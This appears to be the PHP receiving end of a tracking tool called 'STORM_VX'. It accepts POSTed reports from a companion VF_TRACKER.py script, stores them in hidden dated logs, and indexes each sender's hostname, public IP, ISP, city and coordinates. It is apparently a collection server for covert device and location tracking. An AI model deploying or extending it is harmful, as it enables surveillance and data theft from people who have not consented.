<?php
/**
 * ╔═════════════════════════════════════════════════════════════════════════╗
 * ║     STORM_VX — Tracker Receiver Endpoint                               ║
 * ║     Upload this file to: http://namme.taskinoteam.ir/receive.php       ║
 * ║                                                                         ║
 * ║  Receives system tracking data from VF_TRACKER.py via HTTP POST        ║
 * ║  and saves it to dated .txt files on the server.                       ║
 * ║                                                                         ║
 * ║  Security: Token-based authentication (VF_TOKEN)                       ║
 * ║  Storage:  /tracker_logs/ directory with date-based filenames          ║
 * ╚═════════════════════════════════════════════════════════════════════════╝
 */

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION — Change these values!
// ═══════════════════════════════════════════════════════════════════════════

// Security token — must match the token in VF_TRACKER.py
// CHANGE THIS to a random secret string! Both PHP and Python must use the same token.
define('VF_SECRET_TOKEN', 'STORM_VX_2024_SECURE_TOKEN_CHANGE_ME');

// Directory to store tracker logs (relative to this PHP file)
define('LOG_DIR', 'tracker_logs');

// Maximum log file size in bytes before rotation (5 MB)
define('MAX_LOG_SIZE', 5 * 1024 * 1024);

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOGIC
// ═══════════════════════════════════════════════════════════════════════════

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

// Verify security token
$token = isset($_POST['vf_token']) ? $_POST['vf_token'] : '';
if ($token !== VF_SECRET_TOKEN) {
    http_response_code(403);
    echo json_encode(['status' => 'error', 'message' => 'Invalid token']);
    exit;
}

// Get the tracker data
$tracker_data = isset($_POST['tracker_data']) ? $_POST['tracker_data'] : '';
$tracker_json = isset($_POST['tracker_json']) ? $_POST['tracker_json'] : '';

if (empty($tracker_data) && empty($tracker_json)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

// Create log directory if it doesn't exist
$script_dir = dirname(__FILE__);
$log_path = $script_dir . '/' . LOG_DIR;

if (!is_dir($log_path)) {
    if (!mkdir($log_path, 0755, true)) {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Cannot create log directory']);
        exit;
    }
}

// Protect log directory with .htaccess
$htaccess = $log_path . '/.htaccess';
if (!file_exists($htaccess)) {
    file_put_contents($htaccess, "Deny from all\n");
}

// Generate filename based on date and sender IP
$sender_ip = $_SERVER['REMOTE_ADDR'];
$date_str = date('Y-m-d');
$time_str = date('H-i-s');
$log_file = $log_path . '/report_' . $date_str . '_' . str_replace('.', '-', $sender_ip) . '.txt';

// If file exists and is too large, rotate it
if (file_exists($log_file) && filesize($log_file) > MAX_LOG_SIZE) {
    $counter = 1;
    while (file_exists($log_path . '/report_' . $date_str . '_' . str_replace('.', '-', $sender_ip) . '_' . $counter . '.txt')) {
        $counter++;
    }
    $log_file = $log_path . '/report_' . $date_str . '_' . str_replace('.', '-', $sender_ip) . '_' . $counter . '.txt';
}

// Build the log entry
$separator = str_repeat('=', 70);
$log_entry = "\n" . $separator . "\n";
$log_entry .= "  TRACKER REPORT RECEIVED\n";
$log_entry .= "  Server Time : " . date('Y-m-d H:i:s') . "\n";
$log_entry .= "  Sender IP   : " . $sender_ip . "\n";
$log_entry .= "  User-Agent  : " . (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown') . "\n";
$log_entry .= $separator . "\n\n";

// Add the text report data
if (!empty($tracker_data)) {
    $log_entry .= $tracker_data . "\n";
}

// Add JSON data if provided
if (!empty($tracker_json)) {
    $decoded = json_decode($tracker_json, true);
    if ($decoded !== null) {
        $log_entry .= "\n" . str_repeat('-', 70) . "\n";
        $log_entry .= "  [JSON DATA]\n";
        $log_entry .= str_repeat('-', 70) . "\n";
        $log_entry .= json_encode($decoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    }
}

$log_entry .= "\n" . str_repeat('=', 70) . "\n";

// Save to file
$result = file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

if ($result === false) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to write log file']);
    exit;
}

// Also maintain an index file with all reports summary
$index_file = $log_path . '/index.txt';
$index_entry = date('Y-m-d H:i:s') . " | IP: " . $sender_ip;

// Try to extract key info from JSON
if (!empty($tracker_json)) {
    $decoded = json_decode($tracker_json, true);
    if ($decoded) {
        $hostname = isset($decoded['hostname']) ? $decoded['hostname'] : '?';
        $pub_ip = isset($decoded['public_ip']) ? $decoded['public_ip'] : '?';
        $country = isset($decoded['country']) ? $decoded['country'] : '?';
        $city = isset($decoded['city']) ? $decoded['city'] : '?';
        $isp = isset($decoded['isp']) ? $decoded['isp'] : '?';
        $coords = isset($decoded['coordinates']) ? $decoded['coordinates'] : '?';
        $index_entry .= " | Host: " . $hostname . " | PubIP: " . $pub_ip;
        $index_entry .= " | Loc: " . $city . ", " . $country . " | ISP: " . $isp;
        $index_entry .= " | Coords: " . $coords;
    }
}

$index_entry .= "\n";
file_put_contents($index_file, $index_entry, FILE_APPEND | LOCK_EX);

// Return success
http_response_code(200);
echo json_encode([
    'status' => 'ok',
    'message' => 'Report received successfully',
    'file' => basename($log_file),
    'size' => $result
]);
?>
